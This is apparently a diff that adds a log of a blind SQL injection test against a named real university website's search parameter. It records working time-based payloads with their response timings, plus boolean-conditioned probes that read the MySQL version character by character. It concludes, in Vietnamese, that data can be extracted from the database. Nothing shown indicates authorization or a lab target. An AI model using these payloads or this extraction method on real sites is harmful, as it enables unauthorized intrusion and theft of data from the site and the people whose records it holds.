@@ -1,0 +1,35 @@
+SQL INJECTION TIMING TEST - www.uef.edu.vn
+Target: https://www.uef.edu.vn/thu-vien-hinh-anh?Trang_1&txtSearch=<payload>
+Method: GET | Date: 2026-11-09 | time = curl time_total (seconds) | all HTTP 200, no WAF block
+
+== BASELINE / CONTROLS ==
+base2       | 200  0.287027 71052  txtSearch=the0
+ctrl_nosleep| 200  0.234505 71052  txtSearch=the0"XOR(if(now()=sysdate(),0,0))XOR"Z     (giong payload nhung KHONG sleep -> khong delay)
+ctrl_broken | 200  0.328064 71052  txtSearch=the0"XOR(if(now()=sysdate(),sleep(3),0)XOR"Z (sai cu phap -> khong delay, khong error)
+
+== TIME-BASED PAYLOAD: the0"XOR(if(now()=sysdate(),sleep(N),0))XOR"Z ==
+sleep1  | 200  2.373614 71052   sleep(1)
+sleep3a | 200  6.223055 71052   sleep(3)
+sleep3b | 200  6.258981 71052   sleep(3) - lap lai => on dinh
+sleep5  | 200  10.233596 71052  sleep(5)
+
+Delay thua so voi baseline (~0.28s): sleep(1)->+2.09s | sleep(3)->+5.94s | sleep(5)->+9.95s
+=> delay ≈ 2x gia tri sleep => truy van chua tham so chay 2 lan/request (vi du: count + list)
+
+== BOOLEAN-CONDITIONED CONFIRMATION (dieu khien delay bang dieu kien SQL) ==
+IF(ASCII(SUBSTRING(version(),1,1))=53, sleep(3), 0) ->  6.263948s  MATCH '5'
+IF(ASCII(SUBSTRING(version(),1,1))=56, sleep(3), 0) ->  0.252646s  no
+IF(ASCII(SUBSTRING(version(),1,1))=49, sleep(3), 0) ->  0.390573s  no
+IF(ASCII(SUBSTRING(version(),3,1))=55, sleep(3), 0) ->  0.290884s  no ('7')
+IF(ASCII(SUBSTRING(version(),3,1))=53, sleep(3), 0) ->  0.304185s  no ('5')
+IF(ASCII(SUBSTRING(version(),3,1))=54, sleep(3), 0) ->  6.261168s  MATCH '6'
+=> version() bat dau bang "5.6" => MySQL 5.6.x (EOL tu 02/2021)
+
+== RESPONSE BODY ==
+Tat ca response: HTTP 200, size 71052 bytes.
+diff base2 vs sleep1: chi khac 1 dong token ngau nhien:  var token = "92a85d..." vs "40f1161..."
+Khong co error SQL, khong co trang WAF block.
+
+== KET LUAN ==
+Time-based + boolean-based blind SQL injection tren tham so txtSearch, MySQL 5.6.x.
+Oracle dieu kien hoat dong day du (dung dieu kien SQL de bat/tat sleep) -> co the extract du lieu ki tu-theo-ki-tu.
